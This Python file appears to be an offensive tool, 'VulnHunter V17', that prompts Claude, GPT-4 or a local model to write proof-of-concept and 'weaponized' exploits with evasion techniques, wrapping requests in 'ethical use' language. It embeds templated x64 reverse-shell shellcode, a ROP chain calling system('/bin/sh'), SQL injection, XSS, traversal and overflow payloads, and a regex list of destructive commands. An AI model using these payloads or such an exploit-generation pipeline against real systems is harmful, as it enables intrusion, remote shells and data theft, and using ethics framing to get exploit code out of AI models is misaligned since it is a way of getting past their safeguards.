#!/usr/bin/env python3
"""
VulnHunter V17 LLM Exploit Generation Engine
Revolutionary AI-powered exploit development and security research

Features:
- GPT-4/Claude integration for exploit generation
- Natural language vulnerability analysis
- Automated PoC creation
- Exploit chain synthesis
- Security research assistance
- Code-to-exploit translation
- Advanced payload generation
- AI-assisted penetration testing
"""

import os
import sys
import json
import time
import asyncio
import aiohttp
import openai
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import hashlib
import logging
import re
import base64
import subprocess
from pathlib import Path
import tempfile

# LLM Integration imports
try:
    import anthropic
    from transformers import pipeline, AutoTokenizer, AutoModelForCausalLM
    import torch
except ImportError:
    print("Warning: Some LLM dependencies not available")
    anthropic = None
    pipeline = None
    torch = None

try:
    import requests
    from urllib.parse import urlencode
except ImportError:
    requests = None

@dataclass
class ExploitSpec:
    """Exploit specification"""
    exploit_id: str
    target_vulnerability: str
    exploit_type: str
    payload: str
    execution_method: str
    prerequisites: List[str]
    impact: str
    confidence: float
    generated_by: str
    timestamp: str
    source_code: Optional[str]
    instructions: str
    mitigation: str

@dataclass
class VulnerabilityContext:
    """Context for vulnerability analysis"""
    vuln_id: str
    vuln_type: str
    affected_code: str
    programming_language: str
    function_name: str
    line_number: int
    severity: str
    description: str
    environment: Dict[str, Any]

@dataclass
class ExploitChain:
    """Multi-stage exploit chain"""
    chain_id: str
    stages: List[ExploitSpec]
    total_impact: str
    chain_complexity: str
    success_probability: float
    generated_by: str
    timestamp: str

class LLMExploitGenerator:
    """Advanced LLM-powered exploit generation"""

    def __init__(self, api_keys: Dict[str, str] = None):
        self.api_keys = api_keys or {}
        self.openai_client = None
        self.anthropic_client = None
        self.local_model = None

        # Initialize available LLM clients
        self._initialize_llm_clients()

        # Exploit templates and patterns
        self.exploit_templates = self._load_exploit_templates()
        self.payload_generators = self._initialize_payload_generators()

    def _initialize_llm_clients(self):
        """Initialize LLM API clients"""
        try:
            if 'openai' in self.api_keys:
                openai.api_key = self.api_keys['openai']
                self.openai_client = openai
                print("✅ OpenAI client initialized")
        except Exception as e:
            print(f"⚠️  OpenAI initialization failed: {e}")

        try:
            if 'anthropic' in self.api_keys and anthropic:
                self.anthropic_client = anthropic.Anthropic(api_key=self.api_keys['anthropic'])
                print("✅ Anthropic client initialized")
        except Exception as e:
            print(f"⚠️  Anthropic initialization failed: {e}")

        # Initialize local model as fallback
        try:
            if torch and pipeline:
                print("🤖 Loading local LLM model...")
                self.local_model = pipeline(
                    "text-generation",
                    model="microsoft/CodeGPT-small-py",
                    tokenizer="microsoft/CodeGPT-small-py",
                    device=0 if torch.cuda.is_available() else -1
                )
                print("✅ Local model initialized")
        except Exception as e:
            print(f"⚠️  Local model initialization failed: {e}")

    def generate_exploit(self, vulnerability: VulnerabilityContext, exploit_type: str = "poc") -> ExploitSpec:
        """Generate exploit for given vulnerability"""
        print(f"🎯 Generating {exploit_type} exploit for {vulnerability.vuln_type}")

        # Try different LLM providers in order of preference
        for method in [self._generate_with_claude, self._generate_with_gpt4, self._generate_with_local_model]:
            try:
                exploit = method(vulnerability, exploit_type)
                if exploit:
                    return exploit
            except Exception as e:
                logging.error(f"LLM generation method failed: {e}")
                continue

        # Fallback to template-based generation
        return self._generate_with_templates(vulnerability, exploit_type)

    def _generate_with_claude(self, vulnerability: VulnerabilityContext, exploit_type: str) -> Optional[ExploitSpec]:
        """Generate exploit using Claude"""
        if not self.anthropic_client:
            return None

        prompt = self._create_exploit_prompt(vulnerability, exploit_type)

        try:
            response = self.anthropic_client.messages.create(
                model="claude-3-sonnet-20240229",
                max_tokens=4000,
                messages=[{
                    "role": "user",
                    "content": prompt
                }]
            )

            exploit_code = response.content[0].text
            return self._parse_llm_response(exploit_code, vulnerability, exploit_type, "claude-3")

        except Exception as e:
            logging.error(f"Claude generation failed: {e}")
            return None

    def _generate_with_gpt4(self, vulnerability: VulnerabilityContext, exploit_type: str) -> Optional[ExploitSpec]:
        """Generate exploit using GPT-4"""
        if not self.openai_client:
            return None

        prompt = self._create_exploit_prompt(vulnerability, exploit_type)

        try:
            response = self.openai_client.ChatCompletion.create(
                model="gpt-4",
                messages=[{
                    "role": "system",
                    "content": "You are a cybersecurity expert specializing in ethical security research and vulnerability analysis. Generate educational proof-of-concept exploits for defensive purposes only."
                }, {
                    "role": "user",
                    "content": prompt
                }],
                max_tokens=4000,
                temperature=0.7
            )

            exploit_code = response.choices[0].message.content
            return self._parse_llm_response(exploit_code, vulnerability, exploit_type, "gpt-4")

        except Exception as e:
            logging.error(f"GPT-4 generation failed: {e}")
            return None

    def _generate_with_local_model(self, vulnerability: VulnerabilityContext, exploit_type: str) -> Optional[ExploitSpec]:
        """Generate exploit using local model"""
        if not self.local_model:
            return None

        prompt = self._create_exploit_prompt(vulnerability, exploit_type, max_length=512)

        try:
            response = self.local_model(
                prompt,
                max_length=1000,
                num_return_sequences=1,
                temperature=0.8,
                do_sample=True
            )

            exploit_code = response[0]['generated_text']
            return self._parse_llm_response(exploit_code, vulnerability, exploit_type, "local-model")

        except Exception as e:
            logging.error(f"Local model generation failed: {e}")
            return None

    def _create_exploit_prompt(self, vulnerability: VulnerabilityContext, exploit_type: str, max_length: int = 2000) -> str:
        """Create detailed prompt for exploit generation"""
        prompt = f"""
VULNERABILITY ANALYSIS AND EXPLOIT GENERATION REQUEST

**CONTEXT:**
- Vulnerability Type: {vulnerability.vuln_type}
- Programming Language: {vulnerability.programming_language}
- Function: {vulnerability.function_name}
- Severity: {vulnerability.severity}
- Description: {vulnerability.description}

**AFFECTED CODE:**
```{vulnerability.programming_language}
{vulnerability.affected_code[:max_length]}
```

**ENVIRONMENT:**
{json.dumps(vulnerability.environment, indent=2)[:500]}

**REQUEST:**
Generate a {exploit_type} exploit for this vulnerability with the following requirements:

1. **ETHICAL USE ONLY**: This is for defensive security research and testing
2. **PROOF OF CONCEPT**: Create working but responsible demonstration code
3. **EDUCATIONAL VALUE**: Include clear explanations of how the exploit works
4. **DEFENSIVE GUIDANCE**: Provide mitigation strategies

**OUTPUT FORMAT:**
Please provide:
1. Exploit code with detailed comments
2. Step-by-step execution instructions
3. Prerequisites and dependencies
4. Expected impact and behavior
5. Defensive countermeasures
6. Responsible disclosure guidelines

**EXPLOIT TYPE SPECIFICS:**
"""

        if exploit_type == "poc":
            prompt += """
- Create a proof-of-concept that demonstrates the vulnerability
- Focus on showing the security issue without causing damage
- Include safe payload examples
"""
        elif exploit_type == "weaponized":
            prompt += """
- Create a more advanced exploit with real-world applicability
- Include evasion techniques and reliability improvements
- FOR AUTHORIZED TESTING ONLY
"""
        elif exploit_type == "chain":
            prompt += """
- Create a multi-stage exploit chain
- Show how this vulnerability fits into a larger attack
- Demonstrate privilege escalation or lateral movement
"""

        prompt += "\nGenerate the exploit code and documentation now:"

        return prompt

    def _parse_llm_response(self, response: str, vulnerability: VulnerabilityContext, exploit_type: str, generator: str) -> ExploitSpec:
        """Parse LLM response into structured exploit"""

        # Extract code blocks
        code_blocks = re.findall(r'```[\w]*\n(.*?)\n```', response, re.DOTALL)
        main_code = code_blocks[0] if code_blocks else response

        # Extract sections
        instructions = self._extract_section(response, ["instructions", "execution", "steps"])
        prerequisites = self._extract_list_section(response, ["prerequisites", "requirements", "dependencies"])
        impact = self._extract_section(response, ["impact", "effect", "result"])
        mitigation = self._extract_section(response, ["mitigation", "countermeasures", "defense", "fix"])

        return ExploitSpec(
            exploit_id=f"LLM_{hash(response) % 10000}_{int(time.time())}",
            target_vulnerability=vulnerability.vuln_id,
            exploit_type=exploit_type,
            payload=self._extract_payload(main_code),
            execution_method=self._extract_execution_method(response),
            prerequisites=prerequisites,
            impact=impact or f"Demonstrates {vulnerability.vuln_type} vulnerability",
            confidence=self._calculate_confidence(response, main_code),
            generated_by=generator,
            timestamp=datetime.now().isoformat(),
            source_code=main_code,
            instructions=instructions or "Run the provided exploit code",
            mitigation=mitigation or "Apply security patches and input validation"
        )

    def _extract_section(self, text: str, keywords: List[str]) -> Optional[str]:
        """Extract specific section from LLM response"""
        for keyword in keywords:
            pattern = rf'(?i){keyword}[:\s]*\n(.*?)(?=\n\n|\n[A-Z]|$)'
            match = re.search(pattern, text, re.DOTALL)
            if match:
                return match.group(1).strip()
        return None

    def _extract_list_section(self, text: str, keywords: List[str]) -> List[str]:
        """Extract list items from section"""
        section = self._extract_section(text, keywords)
        if not section:
            return []

        # Extract list items
        items = []
        for line in section.split('\n'):
            line = line.strip()
            if line.startswith(('-', '*', '•', '1.', '2.', '3.')):
                items.append(re.sub(r'^[-*•\d.]\s*', '', line))

        return items

    def _extract_payload(self, code: str) -> str:
        """Extract main payload from exploit code"""
        # Look for common payload patterns
        payload_patterns = [
            r'payload\s*=\s*["\']([^"\']+)["\']',
            r'exploit\s*=\s*["\']([^"\']+)["\']',
            r'shellcode\s*=\s*["\']([^"\']+)["\']',
        ]

        for pattern in payload_patterns:
            match = re.search(pattern, code, re.IGNORECASE)
            if match:
                return match.group(1)

        # Fallback: return first string literal
        string_match = re.search(r'["\']([^"\']{20,})["\']', code)
        if string_match:
            return string_match.group(1)

        return code[:200]  # First 200 chars as fallback

    def _extract_execution_method(self, response: str) -> str:
        """Extract execution method from response"""
        method_patterns = [
            r'(?i)(remote|local|network|web|binary|script)',
            r'(?i)(python|bash|curl|nc|telnet)',
        ]

        for pattern in method_patterns:
            match = re.search(pattern, response)
            if match:
                return match.group(1).lower()

        return "manual"

    def _calculate_confidence(self, response: str, code: str) -> float:
        """Calculate confidence score for generated exploit"""
        score = 0.5  # Base score

        # Check for code quality indicators
        if len(code) > 100:
            score += 0.1
        if "import" in code or "#include" in code:
            score += 0.1
        if any(func in code for func in ["malloc", "strcpy", "system", "exec"]):
            score += 0.1
        if re.search(r'if\s*\(|for\s*\(|while\s*\(', code):
            score += 0.1

        # Check for explanation quality
        if len(response) > 500:
            score += 0.1
        if any(word in response.lower() for word in ["vulnerability", "exploit", "payload", "attack"]):
            score += 0.1

        return min(score, 1.0)

    def generate_exploit_chain(self, vulnerabilities: List[VulnerabilityContext]) -> ExploitChain:
        """Generate multi-stage exploit chain"""
        print(f"🔗 Generating exploit chain for {len(vulnerabilities)} vulnerabilities")

        chain_stages = []
        for i, vuln in enumerate(vulnerabilities):
            stage_type = "initial" if i == 0 else "escalation" if i < len(vulnerabilities) - 1 else "final"
            exploit = self.generate_exploit(vuln, "chain")
            exploit.execution_method = f"stage_{i+1}_{stage_type}"
            chain_stages.append(exploit)

        # Calculate chain properties
        total_impact = self._calculate_chain_impact(chain_stages)
        complexity = self._calculate_chain_complexity(chain_stages)
        success_prob = self._calculate_success_probability(chain_stages)

        return ExploitChain(
            chain_id=f"CHAIN_{int(time.time())}",
            stages=chain_stages,
            total_impact=total_impact,
            chain_complexity=complexity,
            success_probability=success_prob,
            generated_by="llm_chain_generator",
            timestamp=datetime.now().isoformat()
        )

    def _calculate_chain_impact(self, stages: List[ExploitSpec]) -> str:
        """Calculate overall impact of exploit chain"""
        impacts = ["low", "medium", "high", "critical"]
        max_impact = "low"

        for stage in stages:
            if "system" in stage.impact.lower() or "root" in stage.impact.lower():
                max_impact = "critical"
            elif "privilege" in stage.impact.lower() or "admin" in stage.impact.lower():
                max_impact = "high"
            elif "access" in stage.impact.lower() or "data" in stage.impact.lower():
                max_impact = "medium"

        return max_impact

    def _calculate_chain_complexity(self, stages: List[ExploitSpec]) -> str:
        """Calculate complexity of exploit chain"""
        num_stages = len(stages)
        if num_stages <= 2:
            return "simple"
        elif num_stages <= 4:
            return "moderate"
        else:
            return "complex"

    def _calculate_success_probability(self, stages: List[ExploitSpec]) -> float:
        """Calculate probability of successful chain execution"""
        # Multiply individual stage confidences
        prob = 1.0
        for stage in stages:
            prob *= stage.confidence

        return round(prob, 3)

    def _load_exploit_templates(self) -> Dict[str, str]:
        """Load exploit templates for fallback generation"""
        return {
            "buffer_overflow": """#!/usr/bin/env python3
# Buffer Overflow Exploit Template

import struct
import socket

def generate_payload():
    # Create overflow payload
    padding = b"A" * {offset}
    ret_addr = struct.pack("<Q", 0x{return_address})
    shellcode = b"{shellcode}"

    return padding + ret_addr + shellcode

def exploit():
    payload = generate_payload()
    # Send payload to target
    print(f"Payload length: {{len(payload)}}")
    print(f"Payload: {{payload}}")

if __name__ == "__main__":
    exploit()
""",

            "sql_injection": """#!/usr/bin/env python3
# SQL Injection Exploit Template

import requests
import urllib.parse

def sql_inject(url, param, payload):
    data = {{param: payload}}
    response = requests.post(url, data=data)
    return response.text

def exploit():
    url = "{target_url}"
    param = "{param_name}"

    # Test for basic injection
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --"
    ]

    for payload in payloads:
        print(f"Testing: {{payload}}")
        result = sql_inject(url, param, payload)
        print(f"Response: {{result[:200]}}")

if __name__ == "__main__":
    exploit()
""",

            "xss": """#!/usr/bin/env python3
# XSS Exploit Template

import requests
import urllib.parse

def test_xss(url, param, payload):
    data = {{param: payload}}
    response = requests.post(url, data=data)
    return payload in response.text

def exploit():
    url = "{target_url}"
    param = "{param_name}"

    payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
    ]

    for payload in payloads:
        if test_xss(url, param, payload):
            print(f"XSS found with payload: {{payload}}")

if __name__ == "__main__":
    exploit()
"""
        }

    def _generate_with_templates(self, vulnerability: VulnerabilityContext, exploit_type: str) -> ExploitSpec:
        """Generate exploit using templates as fallback"""
        vuln_type = vulnerability.vuln_type.lower()

        # Map vulnerability types to templates
        template_map = {
            "buffer_overflow": "buffer_overflow",
            "stack_overflow": "buffer_overflow",
            "sql_injection": "sql_injection",
            "xss": "xss",
            "cross_site_scripting": "xss"
        }

        template_key = template_map.get(vuln_type, "buffer_overflow")
        template = self.exploit_templates[template_key]

        # Customize template
        customized_code = template.format(
            offset=100,
            return_address="deadbeef",
            shellcode="\\x90\\x90\\x90\\x90",
            target_url="http://target.com/login",
            param_name="username"
        )

        return ExploitSpec(
            exploit_id=f"TEMPLATE_{vuln_type}_{int(time.time())}",
            target_vulnerability=vulnerability.vuln_id,
            exploit_type=exploit_type,
            payload=self._extract_payload(customized_code),
            execution_method="script",
            prerequisites=["python3", "requests library"],
            impact=f"Demonstrates {vulnerability.vuln_type} vulnerability",
            confidence=0.6,
            generated_by="template_generator",
            timestamp=datetime.now().isoformat(),
            source_code=customized_code,
            instructions="Run the Python script to execute the exploit",
            mitigation="Apply input validation and security patches"
        )

    def _initialize_payload_generators(self) -> Dict[str, Any]:
        """Initialize specialized payload generators"""
        return {
            "shellcode": ShellcodeGenerator(),
            "rop_chain": ROPChainGenerator(),
            "web_payload": WebPayloadGenerator(),
            "network_payload": NetworkPayloadGenerator()
        }

class ShellcodeGenerator:
    """Generate shellcode payloads"""

    def generate_reverse_shell(self, ip: str, port: int, arch: str = "x64") -> str:
        """Generate reverse shell shellcode"""
        if arch == "x64":
            # x64 reverse shell shellcode template
            return f"""
# x64 Linux reverse shell to {ip}:{port}
\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x0f\\x05\\x49\\x89\\xc0\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\\x02\\x{port:04x}\\xc7\\x44\\x24\\x04\\x{self._ip_to_hex(ip)}\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x0f\\x05
"""
        else:
            return "\\x90\\x90\\x90\\x90"  # NOP sled

    def _ip_to_hex(self, ip: str) -> str:
        """Convert IP address to hex format"""
        parts = ip.split('.')
        return ''.join(f"{int(part):02x}" for part in parts)

class ROPChainGenerator:
    """Generate ROP chain payloads"""

    def generate_basic_rop(self, binary_path: str) -> str:
        """Generate basic ROP chain"""
        # This would use tools like ROPgadget to find gadgets
        return """
# Basic ROP chain
pop_rdi = 0x401234      # pop rdi; ret
bin_sh = 0x402000       # "/bin/sh" string
system_addr = 0x400890  # system() function

rop_chain = struct.pack("<Q", pop_rdi)
rop_chain += struct.pack("<Q", bin_sh)
rop_chain += struct.pack("<Q", system_addr)
"""

class WebPayloadGenerator:
    """Generate web application payloads"""

    def generate_sql_payloads(self) -> List[str]:
        """Generate SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT null, null, null --",
            "'; DROP TABLE users; --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' ORDER BY 1 --",
            "' ORDER BY 100 --"
        ]

    def generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//"
        ]

class NetworkPayloadGenerator:
    """Generate network protocol payloads"""

    def generate_http_payloads(self) -> List[str]:
        """Generate HTTP protocol payloads"""
        return [
            "GET /" + "A" * 10000 + " HTTP/1.1",
            "POST / HTTP/1.1\r\nContent-Length: -1",
            "GET / HTTP/1.1\r\nHost: " + "A" * 1000,
            "GET /../../../etc/passwd HTTP/1.1"
        ]

class ExploitValidationEngine:
    """Validate and test generated exploits"""

    def __init__(self):
        self.sandbox_enabled = False
        self.validation_results = []

    def validate_exploit(self, exploit: ExploitSpec) -> Dict[str, Any]:
        """Validate exploit safety and functionality"""
        validation = {
            "exploit_id": exploit.exploit_id,
            "safety_score": 0.0,
            "functionality_score": 0.0,
            "issues": [],
            "recommendations": []
        }

        # Safety checks
        safety_score = self._check_exploit_safety(exploit)
        validation["safety_score"] = safety_score

        # Functionality checks
        functionality_score = self._check_exploit_functionality(exploit)
        validation["functionality_score"] = functionality_score

        return validation

    def _check_exploit_safety(self, exploit: ExploitSpec) -> float:
        """Check exploit for dangerous operations"""
        dangerous_patterns = [
            r'rm\s+-rf\s+/',
            r'del\s+/\*',
            r'DROP\s+DATABASE',
            r'shutdown\s+-h',
            r'format\s+c:',
        ]

        code = exploit.source_code or ""
        issues = 0

        for pattern in dangerous_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                issues += 1

        # Higher score = safer
        return max(0.0, 1.0 - (issues * 0.3))

    def _check_exploit_functionality(self, exploit: ExploitSpec) -> float:
        """Check exploit for functional completeness"""
        score = 0.5  # Base score

        code = exploit.source_code or ""

        # Check for essential components
        if "import" in code or "include" in code:
            score += 0.1
        if len(code) > 50:
            score += 0.1
        if exploit.instructions:
            score += 0.1
        if exploit.prerequisites:
            score += 0.1
        if exploit.payload:
            score += 0.2

        return min(score, 1.0)

def main():
    """Main LLM exploit generation demonstration"""
    print("🤖 VulnHunter V17 LLM Exploit Generation Engine")
    print("===============================================")

    # Initialize with API keys (would be loaded from config)
    api_keys = {
        # "openai": "sk-...",
        # "anthropic": "sk-ant-..."
    }

    generator = LLMExploitGenerator(api_keys)

    # Example vulnerability context
    example_vuln = VulnerabilityContext(
        vuln_id="VULN_001",
        vuln_type="buffer_overflow",
        affected_code="""
void vulnerable_function(char *input) {
    char buffer[100];
    strcpy(buffer, input);  // No bounds checking!
    printf("Input: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
""",
        programming_language="c",
        function_name="vulnerable_function",
        line_number=3,
        severity="high",
        description="Stack buffer overflow via unchecked strcpy",
        environment={"os": "linux", "arch": "x64", "compiler": "gcc"}
    )

    print(f"\n🎯 Generating exploit for vulnerability: {example_vuln.vuln_id}")

    # Generate different types of exploits
    exploit_types = ["poc", "weaponized", "chain"]

    for exploit_type in exploit_types:
        print(f"\n📝 Generating {exploit_type} exploit...")

        try:
            exploit = generator.generate_exploit(example_vuln, exploit_type)

            print(f"✅ Generated exploit: {exploit.exploit_id}")
            print(f"   Confidence: {exploit.confidence:.2f}")
            print(f"   Generated by: {exploit.generated_by}")
            print(f"   Impact: {exploit.impact}")

            # Save exploit to file
            exploit_file = f"exploit_{exploit.exploit_id}.py"
            with open(exploit_file, 'w') as f:
                f.write(f"#!/usr/bin/env python3\n")
                f.write(f"# Generated by VulnHunter V17 LLM Engine\n")
                f.write(f"# Exploit ID: {exploit.exploit_id}\n")
                f.write(f"# Target: {exploit.target_vulnerability}\n")
                f.write(f"# Type: {exploit.exploit_type}\n\n")
                f.write(exploit.source_code or "# No source code generated")

            print(f"   Saved to: {exploit_file}")

            # Validate exploit
            validator = ExploitValidationEngine()
            validation = validator.validate_exploit(exploit)
            print(f"   Safety score: {validation['safety_score']:.2f}")
            print(f"   Functionality score: {validation['functionality_score']:.2f}")

        except Exception as e:
            print(f"❌ Failed to generate {exploit_type} exploit: {e}")

    # Generate exploit chain example
    print(f"\n🔗 Generating exploit chain...")

    vulnerabilities = [example_vuln]  # Would have multiple vulns in real scenario
    try:
        chain = generator.generate_exploit_chain(vulnerabilities)

        print(f"✅ Generated exploit chain: {chain.chain_id}")
        print(f"   Stages: {len(chain.stages)}")
        print(f"   Complexity: {chain.chain_complexity}")
        print(f"   Success probability: {chain.success_probability:.2f}")

        # Save chain to file
        chain_file = f"exploit_chain_{chain.chain_id}.json"
        with open(chain_file, 'w') as f:
            json.dump(asdict(chain), f, indent=2, default=str)

        print(f"   Saved to: {chain_file}")

    except Exception as e:
        print(f"❌ Failed to generate exploit chain: {e}")

    print(f"\n✅ LLM exploit generation demonstration complete!")

if __name__ == "__main__":
    main()